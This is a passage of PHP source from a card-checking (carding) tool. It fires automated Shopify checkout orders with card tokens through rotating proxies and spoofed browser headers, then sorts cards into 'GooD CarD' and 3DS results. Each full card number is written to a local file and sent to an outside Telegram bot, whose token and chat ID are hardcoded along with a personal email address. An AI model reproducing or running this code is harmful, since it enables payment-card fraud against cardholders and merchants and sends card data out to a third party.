                                            'billingAddress' => [
                                                'streetAddress' => [
                                                    'address1' => $address,
                                                    'address2' => '',
                                                    'city' => $city_us,
                                                    'countryCode' => $country_code,
                                                    'postalCode' => $zip_us,
                                                    'firstName' => $firstname,
                                                    'lastName' => $lastname,
                                                    'zoneCode' => $state_us,
                                                    'phone' => ''
                                                ]
                                            ],
                                            'cardSource' => null
                                        ],
                                        'giftCardPaymentMethod' => null,
                                        'redeemablePaymentMethod' => null,
                                        'walletPaymentMethod' => null,
                                        'walletsPlatformPaymentMethod' => null,
                                        'localPaymentMethod' => null,
                                        'paymentOnDeliveryMethod' => null,
                                        'paymentOnDeliveryMethod2' => null,
                                        'manualPaymentMethod' => null,
                                        'customPaymentMethod' => null,
                                        'offsitePaymentMethod' => null,
                                        'customOnsitePaymentMethod' => null,
                                        'deferredPaymentMethod' => null,
                                        'customerCreditCardPaymentMethod' => null,
                                        'paypalBillingAgreementPaymentMethod' => null
                                    ],
                                    'amount' => [
                                        'value' => [
                                            'amount' => $totalamt,
                                            'currencyCode' => 'USD'
                                        ]
                                    ],
                                    'dueAt' => null
                                ]
                            ],
                            'billingAddress' => [
                                'streetAddress' => [
                                    'address1' => $address,
                                    'address2' => '',
                                    'city' => $city_us,
                                    'countryCode' => $country_code,
                                    'postalCode' => $zip_us,
                                    'firstName' => $firstname,
                                    'lastName' => $lastname,
                                    'zoneCode' => $state_us,
                                    'phone' => ''
                                ]
                            ]
                        ],
                        'buyerIdentity' => [
                            'customer' => [
                                'presentmentCurrency' => 'US',
                                'countryCode' => $country_code
                            ],
                            'email' => $email,
                            'emailChanged' => false,
                            'phoneCountryCode' => 'US',
                            'marketingConsent' => [],
                            'shopPayOptInPhone' => [
                                'countryCode' => $country_code
                            ],
                            'rememberMe' => false
                        ],
                        'tip' => [
                            'tipLines' => []
                        ],
                        'taxes' => [
                            'proposedAllocations' => null,
                            'proposedTotalAmount' => [
                                'value' => [
                                    'amount' => $tax,
                                    'currencyCode' => 'USD'
                                ]
                            ],
                            'proposedTotalIncludedAmount' => null,
                            'proposedMixedStateTotalAmount' => null,
                            'proposedExemptions' => []
                        ],
                        'note' => [
                            'message' => null,
                            'customAttributes' => []
                        ],
                        'localizationExtension' => [
                            'fields' => []
                        ],
                        'nonNegotiableTerms' => null,
                        'scriptFingerprint' => [
                            'signature' => null,
                            'signatureUuid' => null,
                            'lineItemScriptChanges' => [],
                            'paymentScriptChanges' => [],
                            'shippingScriptChanges' => []
                        ],
                        'optionalDuties' => [
                            'buyerRefusesDuties' => false
                        ]
                    ],
                    'attemptToken' => $checkoutToken,
                    'metafields' => [],
                    'analytics' => [
                        'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                        'pageId' => $stable_id
                    ]
                ],
                'operationName' => 'SubmitForCompletion'
            ]);
}
elseif ($currencycode == 'USD') {
    $postf = json_encode(['query' => extractOperationQueryFromFile('jsonp.php', 'SubmitForCompletion'),
            'variables' => [
                'input' => [
                    'sessionInput' => [
                        'sessionToken' => $x_checkout_one_session_token
                    ],
                    'queueToken' => $queue_token,
                    'discounts' => [
                        'lines' => [],
                        'acceptUnexpectedDiscounts' => true
                    ],
                    'delivery' => [
                        'deliveryLines' => [
                            [
                                'destination' => [
                                    'streetAddress' => [
                                        'address1' => $address,
                                        'address2' => '',
                                        'city' => $city_us,
                                        'countryCode' => $country_code,
                                        'postalCode' => $zip_us,
                                        'firstName' => $firstname,
                                        'lastName' => $lastname,
                                        'zoneCode' => $state_us,
                                        'phone' => $phone,
                                        'oneTimeUse' => false,
                                        'coordinates' => [
                                            'latitude' => $lat,
                                            'longitude' => $lon
                                        ]
                                    ]
                                ],
                                'selectedDeliveryStrategy' => [
                                    'deliveryStrategyByHandle' => [
                                        'handle' => $handle,
                                        'customDeliveryRate' => false
                                    ],
                                    'options' => new stdClass()
                                ],
                                'targetMerchandiseLines' => [
                                    'lines' => [
                                        [
                                            'stableId' => $stable_id
                                        ]
                                    ]
                                ],
                                'deliveryMethodTypes' => [
                                    'SHIPPING',
                                    'LOCAL'
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => $delamount,
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'destinationChanged' => false
                            ]
                        ],
                        'noDeliveryRequired' => [],
                        'useProgressiveRates' => false,
                        'prefetchShippingRatesStrategy' => null,
                        'supportsSplitShipping' => true
                    ],
                    'deliveryExpectations' => [
                        'deliveryExpectationLines' => []
                    ],
                    'merchandise' => [
                        'merchandiseLines' => [
                            [
                                'stableId' => $stable_id,
                                'merchandise' => [
                                    'productVariantReference' => [
                                        'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                        'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                        'properties' => [],
                                        'sellingPlanId' => null,
                                        'sellingPlanDigest' => null
                                    ]
                                ],
                                'quantity' => [
                                    'items' => [
                                        'value' => 1
                                    ]
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => $minPrice,
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'lineComponentsSource' => null,
                                'lineComponents' => []
                            ]
                        ]
                    ],
                    'payment' => [
                        'totalAmount' => [
                            'any' => true
                        ],
                        'paymentLines' => [
                            [
                                'paymentMethod' => [
                                    'directPaymentMethod' => [
                                        'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                        'sessionId' => $cctoken,
                                        'billingAddress' => [
                                            'streetAddress' => [
                                                'address1' => $address,
                                                'address2' => '',
                                                'city' => $city_us,
                                                'countryCode' => $country_code,
                                                'postalCode' => $zip_us,
                                                'firstName' => $firstname,
                                                'lastName' => $lastname,
                                                'zoneCode' => $state_us,
                                                'phone' => $phone
                                            ]
                                        ],
                                        'cardSource' => null
                                    ],
                                    'giftCardPaymentMethod' => null,
                                    'redeemablePaymentMethod' => null,
                                    'walletPaymentMethod' => null,
                                    'walletsPlatformPaymentMethod' => null,
                                    'localPaymentMethod' => null,
                                    'paymentOnDeliveryMethod' => null,
                                    'paymentOnDeliveryMethod2' => null,
                                    'manualPaymentMethod' => null,
                                    'customPaymentMethod' => null,
                                    'offsitePaymentMethod' => null,
                                    'customOnsitePaymentMethod' => null,
                                    'deferredPaymentMethod' => null,
                                    'customerCreditCardPaymentMethod' => null,
                                    'paypalBillingAgreementPaymentMethod' => null
                                ],
                                'amount' => [
                                    'value' => [
                                        'amount' => $totalamt,
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'dueAt' => null
                            ]
                        ],
                        'billingAddress' => [
                            'streetAddress' => [
                                'address1' => $address,
                                'address2' => '',
                                'city' => $city_us,
                                'countryCode' => $country_code,
                                'postalCode' => $zip_us,
                                'firstName' => $firstname,
                                'lastName' => $lastname,
                                'zoneCode' => $state_us,
                                'phone' => $phone
                            ]
                        ]
                    ],
                    'buyerIdentity' => [
                        'customer' => [
                            'presentmentCurrency' => 'USD',
                            'countryCode' => $country_code
                        ],
                        'email' => $email,
                        'emailChanged' => false,
                        'phoneCountryCode' => 'US',
                        'marketingConsent' => [],
                        'shopPayOptInPhone' => [
                            'countryCode' => $country_code
                        ]
                    ],
                    'tip' => [
                        'tipLines' => []
                    ],
                    'taxes' => [
                        'proposedAllocations' => null,
                        'proposedTotalAmount' => [
                            'value' => [
                                'amount' => $tax,
                                'currencyCode' => 'USD'
                            ]
                        ],
                        'proposedTotalIncludedAmount' => null,
                        'proposedMixedStateTotalAmount' => null,
                        'proposedExemptions' => []
                    ],
                    'note' => [
                        'message' => null,
                        'customAttributes' => []
                    ],
                    'localizationExtension' => [
                        'fields' => []
                    ],
                    'nonNegotiableTerms' => null,
                    'scriptFingerprint' => [
                        'signature' => null,
                        'signatureUuid' => null,
                        'lineItemScriptChanges' => [],
                        'paymentScriptChanges' => [],
                        'shippingScriptChanges' => []
                    ],
                    'optionalDuties' => [
                        'buyerRefusesDuties' => false
                    ]
                ],
                'attemptToken' => ''.$checkoutToken.'-0a6d87fj9zmj',
                'metafields' => [],
                'analytics' => [
                    'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                    'pageId' => $stable_id
                ]
            ],
            'operationName' => 'SubmitForCompletion'
        ]);    
} 
elseif ($currencycode == 'NZD') {
    $postf = json_encode(['query' => extractOperationQueryFromFile('jsonp.php', 'SubmitForCompletion'),
        'variables' => [
            'input' => [
                'sessionInput' => [
                        'sessionToken' => $x_checkout_one_session_token
                    ],
                    'queueToken' => $queue_token,
                'discounts' => [
                    'lines' => [],
                    'acceptUnexpectedDiscounts' => true
                ],
                'delivery' => [
                    'deliveryLines' => [
                        [
                            'selectedDeliveryStrategy' => [
                                'deliveryStrategyMatchingConditions' => [
                                    'estimatedTimeInTransit' => [
                                        'any' => true
                                    ],
                                    'shipments' => [
                                        'any' => true
                                    ]
                                ],
                                'options' => new stdClass()
                            ],
                            'targetMerchandiseLines' => [
                                'lines' => [
                                    [
                                        'stableId' => $stable_id
                                    ]
                                ]
                            ],
                            'deliveryMethodTypes' => [
                                'NONE'
                            ],
                            'expectedTotalPrice' => [
                                'any' => true
                            ],
                            'destinationChanged' => true
                        ]
                    ],
                    'noDeliveryRequired' => [],
                    'useProgressiveRates' => false,
                    'prefetchShippingRatesStrategy' => null,
                    'supportsSplitShipping' => true
                ],
                'deliveryExpectations' => [
                    'deliveryExpectationLines' => []
                ],
                'merchandise' => [
                    'merchandiseLines' => [
                        [
                            'stableId' => $stable_id,
                            'merchandise' => [
                                'productVariantReference' => [
                                    'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                        'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                    'properties' => [],
                                    'sellingPlanId' => null,
                                    'sellingPlanDigest' => null
                                ]
                            ],
                            'quantity' => [
                                'items' => [
                                    'value' => 1
                                ]
                            ],
                            'expectedTotalPrice' => [
                                'value' => [
                                    'amount' => $minPrice,
                                    'currencyCode' => 'NZD'
                                ]
                            ],
                            'lineComponentsSource' => null,
                            'lineComponents' => []
                        ]
                    ]
                ],
                'payment' => [
                    'totalAmount' => [
                        'any' => true
                    ],
                    'paymentLines' => [
                        [
                            'paymentMethod' => [
                                'directPaymentMethod' => [
                                    'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                    'sessionId' => $cctoken,
                                    'billingAddress' => [
                                        'streetAddress' => [
                                            'address1' => '11 Northside Drive',
                                            'address2' => 'Westgate',
                                            'city' => 'Auckland',
                                            'countryCode' => 'NZ',
                                            'postalCode' => '0814',
                                            'firstName' => 'xypher',
                                            'lastName' => 'xd',
                                            'zoneCode' => 'AUK',
                                            'phone' => ''
                                        ]
                                    ],
                                    'cardSource' => null
                                ],
                                'giftCardPaymentMethod' => null,
                                'redeemablePaymentMethod' => null,
                                'walletPaymentMethod' => null,
                                'walletsPlatformPaymentMethod' => null,
                                'localPaymentMethod' => null,
                                'paymentOnDeliveryMethod' => null,
                                'paymentOnDeliveryMethod2' => null,
                                'manualPaymentMethod' => null,
                                'customPaymentMethod' => null,
                                'offsitePaymentMethod' => null,
                                'customOnsitePaymentMethod' => null,
                                'deferredPaymentMethod' => null,
                                'customerCreditCardPaymentMethod' => null,
                                'paypalBillingAgreementPaymentMethod' => null
                            ],
                            'amount' => [
                                'value' => [
                                    'amount' => $totalamt,
                                    'currencyCode' => 'NZD'
                                ]
                            ],
                            'dueAt' => null
                        ]
                    ],
                    'billingAddress' => [
                        'streetAddress' => [
                            'address1' => '11 Northside Drive',
                            'address2' => 'Westgate',
                            'city' => 'Auckland',
                            'countryCode' => 'NZ',
                            'postalCode' => '0814',
                            'firstName' => 'xypher',
                            'lastName' => 'xd',
                            'zoneCode' => 'AUK',
                            'phone' => ''
                        ]
                    ]
                ],
                'buyerIdentity' => [
                    'customer' => [
                        'presentmentCurrency' => 'NZD',
                        'countryCode' => 'IN'
                    ],
                    'email' => 'insaneff612@gmail.com',
                    'emailChanged' => false,
                    'phoneCountryCode' => 'IN',
                    'marketingConsent' => [],
                    'shopPayOptInPhone' => [
                        'number' => '',
                        'countryCode' => 'IN'
                    ],
                    'rememberMe' => false
                ],
                'tip' => [
                    'tipLines' => []
                ],
                'taxes' => [
                    'proposedAllocations' => null,
                    'proposedTotalAmount' => [
                        'value' => [
                            'amount' => '0',
                            'currencyCode' => 'NZD'
                        ]
                    ],
                    'proposedTotalIncludedAmount' => null,
                    'proposedMixedStateTotalAmount' => null,
                    'proposedExemptions' => []
                ],
                'note' => [
                    'message' => null,
                    'customAttributes' => []
                ],
                'localizationExtension' => [
                    'fields' => []
                ],
                'nonNegotiableTerms' => null,
                'scriptFingerprint' => [
                    'signature' => null,
                    'signatureUuid' => null,
                    'lineItemScriptChanges' => [],
                    'paymentScriptChanges' => [],
                    'shippingScriptChanges' => []
                ],
                'optionalDuties' => [
                    'buyerRefusesDuties' => false
                ]
            ],
            'attemptToken' => $checkoutToken . '-y4dcjm00nor',
            'metafields' => [],
            'analytics' => [
                'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                'pageId' => $stable_id
            ]
        ],
        'operationName' => 'SubmitForCompletion'
    ]);
}

 else {$postf = json_encode([
 'query' => extractOperationQueryFromFile('jsonp.php', 'SubmitForCompletion'),  
         'variables' => [
             'input' => [
                 'sessionInput' => [
                     'sessionToken' => $x_checkout_one_session_token
                 ],
                 'queueToken' => $queue_token,
                 'discounts' => [
                     'lines' => [],
                     'acceptUnexpectedDiscounts' => true
                 ],
                 'delivery' => [
                     'deliveryLines' => [
                         [
                             'destination' => [
                                 'streetAddress' => [
                                     'address1' => $address,
                                     'address2' => '',
                                     'city' => $city_us,
                                      'countryCode' => $country_code,
                                     'postalCode' => $zip_us,
                                     'firstName' => $firstname,
                                     'lastName' => $lastname,
                                     'zoneCode' => $zip_us,
                                     'phone' => $phone,
                                     'oneTimeUse' => false,
                                     'coordinates' => [
                                         'latitude' => $lat,
                                         'longitude' => $lon
                                     ]
                                 ]
                             ],
                             'selectedDeliveryStrategy' => [
                                 'deliveryStrategyByHandle' => [
                                     'handle' => $handle,
                                     'customDeliveryRate' => false
                                 ],
                                 'options' => new stdClass()
                             ],
                             'targetMerchandiseLines' => [
                                 'lines' => [
                                     [
                                         'stableId' => $stable_id
                                     ]
                                 ]
                             ],
                             'deliveryMethodTypes' => [
                                 'SHIPPING',
                                 'LOCAL'
                             ],
                             'expectedTotalPrice' => [
                                 'value' => [
                                     'amount' => $delamount,
                                     'currencyCode' => 'USD'
                                 ]
                             ],
                             'destinationChanged' => false
                         ]
                     ],
                     'noDeliveryRequired' => [],
                     'useProgressiveRates' => false,
                     'prefetchShippingRatesStrategy' => null,
                     'supportsSplitShipping' => true
                 ],
                 'deliveryExpectations' => [
                     'deliveryExpectationLines' => []
                 ],
                 'merchandise' => [
                     'merchandiseLines' => [
                         [
                             'stableId' => $stable_id,
                             'merchandise' => [
                                 'productVariantReference' => [
                                     'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                     'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                     'properties' => [],
                                     'sellingPlanId' => null,
                                     'sellingPlanDigest' => null
                                 ]
                             ],
                             'quantity' => [
                                 'items' => [
                                     'value' => 1
                                 ]
                             ],
                             'expectedTotalPrice' => [
                                 'value' => [
                                     'amount' => $minPrice,
                                     'currencyCode' => 'USD'
                                 ]
                             ],
                             'lineComponentsSource' => null,
                             'lineComponents' => []
                         ]
                     ]
                 ],
                 'payment' => [
                     'totalAmount' => [
                         'any' => true
                     ],
                     'paymentLines' => [
                         [
                             'paymentMethod' => [
                                 'directPaymentMethod' => [
                                     'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                     'sessionId' => $cctoken,
                                     'billingAddress' => [
                                         'streetAddress' => [
                                             'address1' => $address,
                                             'address2' => '',
                                             'city' => $city_us,
                                            'countryCode' => $country_code,
                                             'postalCode' => $zip_us,
                                             'firstName' => $firstname,
                                             'lastName' => $lastname,
                                             'zoneCode' => $zip_us,
                                             'phone' => $phone
                                         ]
                                     ],
                                     'cardSource' => null
                                 ],
                                 'giftCardPaymentMethod' => null,
                                 'redeemablePaymentMethod' => null,
                                 'walletPaymentMethod' => null,
                                 'walletsPlatformPaymentMethod' => null,
                                 'localPaymentMethod' => null,
                                 'paymentOnDeliveryMethod' => null,
                                 'paymentOnDeliveryMethod2' => null,
                                 'manualPaymentMethod' => null,
                                 'customPaymentMethod' => null,
                                 'offsitePaymentMethod' => null,
                                 'customOnsitePaymentMethod' => null,
                                 'deferredPaymentMethod' => null,
                                 'customerCreditCardPaymentMethod' => null,
                                 'paypalBillingAgreementPaymentMethod' => null
                             ],
                             'amount' => [
                                 'value' => [
                                     'amount' => $totalamt,
                                     'currencyCode' => 'USD'
                                 ]
                             ],
                             'dueAt' => null
                         ]
                     ],
                     'billingAddress' => [
                         'streetAddress' => [
                             'address1' => $address,
                             'address2' => '',
                             'city' => $city_us,
                            'countryCode' => $country_code,
                             'postalCode' => $zip_us,
                             'firstName' => $firstname,
                             'lastName' => $lastname,
                             'zoneCode' => $state_us,
                             'phone' => $phone
                         ]
                     ]
                 ],
                 'buyerIdentity' => [
                     'customer' => [
                         'presentmentCurrency' => 'USD',
                        'countryCode' => $country_code
                     ],
                     'email' => $email,
                     'emailChanged' => false,
                     'phoneCountryCode' => 'US',
                     'marketingConsent' => [],
                     'shopPayOptInPhone' => [
                        'countryCode' => $country_code
                     ]
                 ],
                 'tip' => [
                     'tipLines' => []
                 ],
                 'taxes' => [
                     'proposedAllocations' => null,
                     'proposedTotalAmount' => [
                         'value' => [
                             'amount' => $tax,
                             'currencyCode' => 'USD'
                         ]
                     ],
                     'proposedTotalIncludedAmount' => null,
                     'proposedMixedStateTotalAmount' => null,
                     'proposedExemptions' => []
                 ],
                 'note' => [
                     'message' => null,
                     'customAttributes' => []
                 ],
                 'localizationExtension' => [
                     'fields' => []
                 ],
                 'nonNegotiableTerms' => null,
                 'scriptFingerprint' => [
                     'signature' => null,
                     'signatureUuid' => null,
                     'lineItemScriptChanges' => [],
                     'paymentScriptChanges' => [],
                     'shippingScriptChanges' => []
                 ],
                 'optionalDuties' => [
                     'buyerRefusesDuties' => false
                 ]
             ],
             'attemptToken' => ''.$checkoutToken.'-0a6d87fj9zmj',
             'metafields' => [],
             'analytics' => [
                 'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                 'pageId' => $stable_id
             ]
         ],
         'operationName' => 'SubmitForCompletion'
     ]);    
 }
     $totalamt = $firstStrategy->runningTotal->value->amount;
 recipt:
     // timed wait between proposal and receipt poll
     if (runtime_cfg()['sleep']>0) { usleep((int)(runtime_cfg()['sleep'] * 1000000)); }
      $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');
  apply_proxy_if_used($ch, $urlbase);
  apply_common_timeouts($ch);

 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'accept: application/json',
     'accept-language: en-US',
     'content-type: application/json',
     'origin: '.$urlbase,
     'priority: u=1, i',
     'referer: '.$urlbase.'/',
     'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
     'sec-ch-ua-mobile: ?0',
     'sec-ch-ua-platform: "Windows"',
     'sec-fetch-dest: empty',
     'sec-fetch-mode: cors',
     'sec-fetch-site: same-origin',
     'user-agent: '.$ua,
     'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
     'x-checkout-web-deploy-stage: production',
     'x-checkout-web-server-handling: fast',
     'x-checkout-web-server-rendering: no',
     'x-checkout-web-source-id: ' . $checkoutToken,
     'Expect:',
 ]);


 curl_setopt($ch, CURLOPT_POSTFIELDS, $postf);

 $response4 = curl_exec($ch);
 $curlErr = curl_errno($ch);
 $curlErrMsg = curl_error($ch);
 curl_close($ch);
 //echo "<li>receipt: $response4<li>";
 if ($curlErr) {
     if ($retryCount < $maxRetries) {
         $retryCount++;
         goto recipt; 
     } else {
         $err = 'cURL error: ' . $curlErrMsg;
         $result_data = [
        'Response' => $err,
    ];
    $result_data['ProxyStatus'] = $proxy_status;
    $result_data['ProxyIP'] = ($proxy_used ? $proxy_ip : 'N/A');
    $result = json_encode($result_data);
         send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
         exit;
     }
 }

 $response4js = json_decode($response4);

 if (isset($response4js->data->submitForCompletion->receipt->id)) {
     $recipt_id = $response4js->data->submitForCompletion->receipt->id;
 } elseif (empty($recipt_id)) {
     // Rotate proxy and retry when receipt is empty (up to 3 rotations)
     static $receiptRotateAttempts = 0;
     if ($receiptRotateAttempts < 3 && !$noproxy_requested) {
         $receiptRotateAttempts++;
         $alt = select_working_proxy_for_url('ProxyList.txt', $site1, 2);
         if ($alt) {
             $ptype = 'http';
             $addr = $alt;
             if (preg_match('/^(https?|socks4|socks5):\/\/(.+)$/i', $alt, $m)) { $ptype = strtolower($m[1]); $addr = $m[2]; }
             $parts = explode(':', $addr);
             if (count($parts) >= 2) {
                 $proxy_ip = $parts[0];
                 $proxy_port = $parts[1];
                 if (count($parts) >= 4) { $proxy_user = $parts[2]; $proxy_pass = $parts[3]; }
                 $proxy_type = $ptype;
                 $proxy_used = true;
                 $proxy_status = 'Live (rotated due to empty receipt)';
             }
         }
         goto proposal; // rebuild session with new proxy
     }
     $err = 'Receipt ID is empty';
     $result_data = [
        'Response' => $err,
    ];
    $result_data['ProxyStatus'] = $proxy_status;
    $result_data['ProxyIP'] = ($proxy_used ? $proxy_ip : 'N/A');
    $result = json_encode($result_data);
     send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
     exit;
 }

 
 
 poll:
 $postf2 = json_encode([
     'query' => extractOperationQueryFromFile('jsonp.php', 'PollForReceipt'),
     'variables' => [
         'receiptId' => $recipt_id,
         'sessionToken' => $x_checkout_one_session_token
     ],
     'operationName' => 'PollForReceipt'
 ]);
 // optional short wait between polls
 if (runtime_cfg()['sleep']>0) { usleep((int)(runtime_cfg()['sleep'] * 1000000)); }
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
 apply_proxy_if_used($ch, $urlbase);
 apply_common_timeouts($ch);

 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
'accept: application/json',
'accept-language: en-US',
'content-type: application/json',
'origin: '.$urlbase,
'priority: u=1, i',
'referer: '.$urlbase,
'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: '.$ua,
'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
'x-checkout-web-build-id: ' . $web_build_id,
'x-checkout-web-deploy-stage: production',
'x-checkout-web-server-handling: fast',
'x-checkout-web-server-rendering: no',
'x-checkout-web-source-id: ' . $checkoutToken,
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);

$response5 = curl_exec($ch);
$curlErr = curl_errno($ch);
$curlErrMsg = curl_error($ch);
curl_close($ch);
// echo "<li>Resp_5: $response5<li>";
if ($curlErr) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto poll; 
    } else {
    $err = 'cURL error: ' . $curlErrMsg;
    $result_array = [
        'Response' => $err,
        'ProxyStatus' => $proxy_status,
        'ProxyIP' => ($proxy_used ? $proxy_ip : 'N/A')
    ];
    $result = json_encode($result_array);
    send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
    exit;
}
}
if (strpos($response5, '"__typename":"ProcessingReceipt"') !== false) {
    usleep(100000); // Wait 0.1 seconds before retrying (ultra-fast)
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto poll;
    } else {
        send_final_response(['Response' => 'Error: Max Retries'], $proxy_used, $proxy_ip, $proxy_port);
    }
}
if (strpos($response5, '"__typename":"WaitingReceipt"') !== false) {
    usleep(100000); // Wait 0.1 seconds before retrying (ultra-fast)
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto poll;
    } else {
        send_final_response(['Response' => 'Error: Max Retries'], $proxy_used, $proxy_ip, $proxy_port);
    }
}

// echo "<li>CheckoutUrl: $checkouturl<li>";
$file = 'cc_responses.txt';
$content = "cc = $cc1\nresponse = $response5\n\n";
@file_put_contents($file, $content, FILE_APPEND);
$r5js = (json_decode($response5));
$start_time = microtime(true);

function send_telegram_log($bot_token, $chat_id, $message) {
    // Enrich every message with proxy and timestamp info automatically
    global $proxy_used, $proxy_ip, $proxy_port;
    $sentAt = date('Y-m-d H:i:s');
    $proxyStr = $proxy_used ? (trim($proxy_ip).':'.trim($proxy_port)) : 'N/A';

    // If message ends with </pre>, try to insert inside the block for better formatting
    if (preg_match('#</pre>\s*$#i', $message)) {
        $extra = "\n<b>Proxy:</b> $proxyStr\n<b>Sent At:</b> $sentAt";
        $message = preg_replace('#</pre>\s*$#i', $extra.'</pre>', $message, 1);
    } else {
        $message .= "\n<b>Proxy:</b> $proxyStr\n<b>Sent At:</b> $sentAt";
    }

    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $maxRetries = 3; // Max retries for Telegram message
    $retryCount = 0;

    do {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($result !== false && $http_code == 200) {
            return true; // Success
        }
        $retryCount++;
        sleep(1); // Wait 1 second before retrying
    } while ($retryCount < $maxRetries);

    return false; // Failed after retries
}

if (
strpos($response5, $checkouturl . '/thank_you') ||
strpos($response5, $checkouturl . '/post_purchase') ||
strpos($response5, 'Your order is confirmed') ||
strpos($response5, 'Thank you') ||
strpos($response5, 'ThankYou') ||
strpos($response5, 'thank_you') ||
strpos($response5, 'success') ||
strpos($response5, 'classicThankYouPageUrl') ||
strpos($response5, '"__typename":"ProcessedReceipt"') ||
strpos($response5, 'SUCCESS')
) {
$err = 'Thank You ' . $totalamt;
$response_type = 'Thank You';
$time_taken = round(microtime(true) - $start_time, 2);
$log_message = "<b>GooD CarD 🔥</b>\n" .
"<b>Full Card:</b> <code>$cc1</code>\n" .
"<pre><b>Site:</b> $checkouturl\n" .
"<b>Response:</b> $response_type\n" .
"<b>Gateway:</b> $gateway\n" .
"<b>Amount:</b> $totalamt$\n" .
"<b>Time:</b> {$time_taken}s</pre>";
send_telegram_log("8063859579:AAHiOG2O4oBDJJswouRUScMOZDxGACXigPI", "5652614329", $log_message);
$result = json_encode([
'Response' => $err,
'Price' => $totalamt,
'Gateway' => $gateway,
'cc' => $cc1,
'CC_Info' => [
    'BIN' => $cc_info['bin'],
    'Brand' => $cc_info['brand'],
    'Type' => $cc_info['type'],
    'Country' => $cc_info['country'],
    'Country_Name' => $cc_info['country_name'],
    'Bank' => $cc_info['bank']
]
]);
send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
exit;
} elseif (strpos($response5, 'CompletePaymentChallenge')) {
$err = '3ds cc';
$time_taken = round(microtime(true) - $start_time, 2);
$log_message = "<b>3DS CarD ⚠️</b>\n" .
"<b>Full Card:</b> <code>$cc1</code>\n" .
"<pre><b>Site:</b> $checkouturl\n" .
"<b>Response:</b> 3DS Challenge\n" .
"<b>Gateway:</b> $gateway\n" .
"<b>Amount:</b> $totalamt$\n" .
"<b>Time:</b> {$time_taken}s</pre>";
send_telegram_log("8063859579:AAHiOG2O4oBDJJswouRUScMOZDxGACXigPI", "5652614329", $log_message);
$result_data = [
'Response' => $err,
'Price' => $totalamt,
'Gateway' => $gateway,
'cc' => $cc1,
'CC_Info' => [
    'BIN' => $cc_info['bin'],
    'Brand' => $cc_info['brand'],
    'Type' => $cc_info['type'],
    'Country' => $cc_info['country'],
    'Country_Name' => $cc_info['country_name'],
    'Bank' => $cc_info['bank']
]
];
send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
exit;
} elseif (strpos($response5, '/stripe/authentications/') || 
           strpos($response5, 'stripe_authentication') ||
           strpos($response5, '"type":"stripe_authentication"') ||
           strpos($response5, 'requires_action') ||
           strpos($response5, '"authentication_required"')) {
$err = 'Stripe 3DS Authentication Required';
$time_taken = round(microtime(true) - $start_time, 2);
$log_message = "<b>Stripe 3DS CarD ⚠️</b>\n" .
"<b>Full Card:</b> <code>$cc1</code>\n" .
"<pre><b>Site:</b> $checkouturl\n" .
"<b>Response:</b> 3DS/SCA Challenge (Stripe)\n" .
"<b>Gateway:</b> $gateway\n" .
"<b>Amount:</b> $totalamt$\n" .
"<b>Time:</b> {$time_taken}s</pre>";
send_telegram_log("8063859579:AAHiOG2O4oBDJJswouRUScMOZDxGACXigPI", "5652614329", $log_message);
$result_data = [
'Response' => $err,
'Price' => $totalamt,
'Gateway' => 'Stripe',
'cc' => $cc1,
'RequiresAction' => true,
'AuthenticationType' => '3DS/SCA',
'CC_Info' => [
    'BIN' => $cc_info['bin'],
